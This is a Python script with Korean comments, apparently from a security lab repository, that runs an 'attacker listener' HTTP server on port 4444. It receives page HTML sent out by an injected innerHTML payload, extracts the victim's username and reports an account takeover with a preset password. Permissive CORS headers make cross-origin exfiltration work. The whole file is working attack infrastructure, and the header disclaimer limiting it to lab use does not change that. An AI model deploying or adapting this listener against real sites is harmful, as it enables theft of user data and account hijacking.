# 허가된 본인 소유/실습 환경에서만 사용하세요. 무단 계정 변경·정보 수집에 사용하지 마세요.
# 사용·변형에 따른 법적 책임은 행위자에게 있습니다. 자세한 내용: ../../docs/LEGAL_AND_SAFETY.md

import urllib.parse
import re
from http.server import BaseHTTPRequestHandler, HTTPServer

ATTACKER_PASSWORD = "hacked123"
PORT = 4444

class AttackerListener(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/leak":
            # 1. POST 데이터 수신 및 URL 디코딩
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)
            html_body = parsed_data.get('data', [''])[0]

            # 2. [정밀 파싱] 제공해주신 구조 타겟팅 정규식
            # <em>Username:</em> 태그가 끝난 직후, 뒤따라오는 공백/줄바꿈/따옴표 등을 건너뛰고
            # 순수 계정명(admin 등)만 낚아챕니다.
            username = "Unknown"
            
            # 패턴 설명:
            # - <em>Username:</em> 영역 매칭
            # - [^A-Za-z0-9]* : 태그가 끝난 뒤 유저명 앞에 낄 수 있는 따옴표("), 공백, 줄바꿈 등을 전부 무시
            # - ([A-Za-z0-9_-]+) : 실제 계정명만 그룹으로 추출
            match = re.search(r"<em>Username:</em>[^A-Za-z0-9]*([A-Za-z0-9_-]+)", html_body, re.IGNORECASE)
            
            if match:
                username = match.group(1).strip()

            # 3. 결과 콘솔 출력
            print("\n" + "="*50)
            print(f"[★] 공격 성공 - 피해자 정보 수집 완료")
            print(f"[+] 탈취한 계정명: {username}")
            print(f"[+] 변경된 비밀번호: {ATTACKER_PASSWORD}")
            print(f"[➔] 결과: {username}:{ATTACKER_PASSWORD} 로 변경 완료!")
            print("="*50 + "\n")
            
            # CORS 에러 방지 응답
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b"OK")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

def run_server():
    server_address = ('', PORT)
    httpd = HTTPServer(server_address, AttackerListener)
    print(f"[*] 공격자 리스너 서버 가동 중... (Port: {PORT})")
    print("[*] innerHTML 페이로드로부터 데이터를 대기하고 있습니다.\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] 서버를 종료합니다.")
        httpd.server_close()

if __name__ == "__main__":
    run_server()
